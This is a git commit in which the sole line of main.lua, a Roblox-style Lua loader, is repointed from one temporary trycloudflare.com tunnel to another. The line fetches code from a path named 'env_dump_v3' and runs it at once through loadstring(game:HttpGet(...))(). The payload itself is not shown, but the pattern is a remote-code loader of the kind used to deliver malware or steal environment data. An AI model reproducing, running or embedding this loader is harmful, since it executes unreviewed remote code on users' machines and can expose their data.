2827746961dfa2d5417ad1501ea2bbf3443ecb04
Cipher <75399147+Cipher3569@users.noreply.github.com>
2026-09-17 02:16:08 -0400

    updated url

--- main.lua
+++ main.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://actually-bytes-affecting-shore.trycloudflare.com/env_dump_v3"))()
+loadstring(game:HttpGet("https://especially-violations-told-primary.trycloudflare.com/env_dump_v3"))()
